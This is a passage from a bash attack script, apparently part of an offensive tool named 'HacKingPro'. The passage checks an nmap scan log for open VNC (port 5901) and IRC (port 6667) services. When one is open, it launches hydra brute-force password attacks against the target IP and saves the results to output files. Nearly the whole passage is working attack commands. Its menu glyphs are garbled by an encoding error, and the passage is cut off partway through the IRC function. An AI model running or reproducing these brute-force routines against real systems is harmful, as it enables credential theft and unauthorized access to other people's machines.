  #  Port 5901 (VNC)
  BruteVNC5901(){
   if grep -q 5901/tcp ${targetNAME}-HacKingPro-nmap.log ; then
    echo "        ${BBlue}|â”€â”€[${BRed} ğŸ¯ ${BBlue}]â”€â”€â•¼ ${BGreen} Port 5901(VNC) is open. Starting bruteforce...\n"
		sleep 1
		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
		Finished_Brute "${targetIP}"
   else
    echo "        ${BBlue}|â”€â”€[${BRed} âŒ ${BBlue}]â”€â”€â•¼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
   fi
}
  BruteVNC5901

  #  Port 6667 (IRC)
  BruteIRC(){
    if grep -q 6667/tcp ${targetNAME}-HacKingPro-nmap.log ; then
      echo "        ${BBlue}|â”€â”€[${BRed} ğŸ¯ ${BBlue}]â”€â”€â•¼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
      sleep 1
      hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
      Finished_Brute "${targetIP}"
    else
      echo "        ${BBlue}|â”€â”€[${BRed} âŒ ${BBlue}]â”€â”€â•¼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
